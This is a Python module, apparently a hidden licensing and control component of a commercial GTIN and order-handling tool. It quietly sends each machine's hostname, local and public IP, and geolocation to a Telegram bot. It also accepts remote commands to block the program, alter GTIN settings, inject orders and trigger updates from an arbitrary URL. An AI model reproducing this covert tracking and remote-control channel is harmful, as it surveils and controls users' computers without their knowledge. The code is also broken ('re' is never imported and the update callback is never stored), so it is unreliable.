import requests
import threading
import time
import socket
import os
from datetime import datetime

class StealthProtection:
    def __init__(self, token, chat_id, serial, on_block_callback, on_active_callback,
                 on_gtin_callback=None, on_gtin_toggle_callback=None, on_order_callback=None, on_update_callback=None):
        self.token = token
        self.chat_id = chat_id
        self.serial = serial
        self.on_block_callback = on_block_callback
        self.on_active_callback = on_active_callback
        self.on_gtin_callback = on_gtin_callback
        self.on_gtin_toggle_callback = on_gtin_toggle_callback
        self.on_order_callback = on_order_callback
        self.running = True
        self.last_update_id = 0

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def get_geo_info(self):
        try:
            resp = requests.get("http://ip-api.com/json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "public_ip": data.get("query", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "city": data.get("city", "Unknown")
                }
        except: pass
        return {"public_ip": "Unknown", "country": "Unknown", "region": "Unknown", "city": "Unknown"}

    def send_notification(self, status):
        if not self.token or not self.chat_id: return

        local_ip = self.get_local_ip()
        geo = self.get_geo_info()
        hostname = socket.gethostname()
        date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        msg = (f"🚀 Программа запущена\n"
               f"🔢 Серийный номер: {self.serial}\n"
               f"💻 Компьютер: {hostname}\n"
               f"🌐 IP (Локальный): {local_ip}\n"
               f"🌍 IP (Публичный): {geo['public_ip']}\n"
               f"📍 Место: {geo['country']}, {geo['region']}\n"
               f"📅 Дата: {date}\n"
               f"📊 Статус: {status}")
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage",
                          data={"chat_id": self.chat_id, "text": msg}, timeout=10)
        except Exception as e:
            print(f"Stealth notification error: {e}")

    def poll(self):
        while self.running:
            if not self.token:
                time.sleep(30)
                continue
            try:
                resp = requests.get(f"https://api.telegram.org/bot{self.token}/getUpdates",
                                    params={"offset": self.last_update_id + 1, "timeout": 20}, timeout=25)
                if resp.status_code == 200:
                    data = resp.json()
                    for update in data.get("result", []):
                        self.last_update_id = update["update_id"]
                        message = update.get("message", {})
                        text = message.get("text", "").strip().lower()
                        # Формат команд:
                        # block SERIAL
                        # active SERIAL
                        # gtin SERIAL VALUE
                        # gtin_on SERIAL
                        # gtin_off SERIAL
                        if text:
                            parts = text.split()
                            if len(parts) >= 2:
                                command = parts[0]
                                target_serial = parts[1].upper()
                                if target_serial == self.serial.upper():
                                    chat_id = message.get("chat", {}).get("id")
                                    if command == "block":
                                        self.on_block_callback()
                                        self.reply(chat_id, f"✅ Программа {self.serial} ЗАБЛОКИРОВАНА")
                                    elif command == "active":
                                        self.on_active_callback()
                                        self.reply(chat_id, f"✅ Программа {self.serial} РАЗБЛОКИРОВАНА")
                                    elif command == "gtin" and len(parts) >= 3 and self.on_gtin_callback:
                                        new_gtin = parts[2]
                                        self.on_gtin_callback(new_gtin)
                                        self.reply(chat_id, f"✅ GTIN для {self.serial} изменен на {new_gtin}")
                                    elif command == "gtin_on" and self.on_gtin_toggle_callback:
                                        self.on_gtin_toggle_callback(True)
                                        self.reply(chat_id, f"✅ Проверка GTIN для {self.serial} ВКЛЮЧЕНА")
                                    elif command == "gtin_off" and self.on_gtin_toggle_callback:
                                        self.on_gtin_toggle_callback(False)
                                        self.reply(chat_id, f"✅ Проверка GTIN для {self.serial} ВЫКЛЮЧЕНА")
                                    elif command == "order" and len(parts) >= 3 and self.on_order_callback:
                                        # format: order SERIAL заказ NUM продукт NAME кол-во UNITS РЦ RC
                                        # Или просто: order SERIAL NUM NAME UNITS RC
                                        try:
                                            raw_text = message.get("text", "")
                                            # Извлекаем данные с помощью regex
                                            num_m = re.search(r'(?:заказ|num)\s+(\d+)', raw_text, re.I)
                                            prod_m = re.search(r'(?:продукт|name)\s+(.*?)(?=\s+(?:кол-во|units|РЦ|rc|$))', raw_text, re.I)
                                            units_m = re.search(r'(?:кол-во|units)\s+(\d+)', raw_text, re.I)
                                            rc_m = re.search(r'(?:РЦ|rc)\s+(.*?)(?=$)', raw_text, re.I)

                                            o_num = num_m.group(1) if num_m else parts[2]
                                            o_prod = prod_m.group(1) if prod_m else ""
                                            o_units = int(units_m.group(1)) if units_m else 0
                                            o_rc = rc_m.group(1) if rc_m else ""

                                            self.on_order_callback(o_num, o_prod, o_units, o_rc)
                                            self.reply(chat_id, f"✅ Заказ {o_num} ({o_prod}) на {o_units} шт для {self.serial} принят")
                                        except Exception as e:
                                            self.reply(chat_id, f"❌ Ошибка парсинга заказа: {e}")
                                    elif command == "update" and self.on_update_callback:
                                        # format: update SERIAL URL
                                        url = parts[2] if len(parts) >= 3 else ""
                                        self.on_update_callback(url)
                                        self.reply(chat_id, f"🚀 Запущено обновление для {self.serial}")
            except:
                time.sleep(10)
            time.sleep(2)

    def reply(self, chat_id, text):
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage",
                          data={"chat_id": chat_id, "text": text}, timeout=10)
        except: pass

    def start(self):
        threading.Thread(target=self.poll, daemon=True).start()

    def stop(self):
        self.running = False
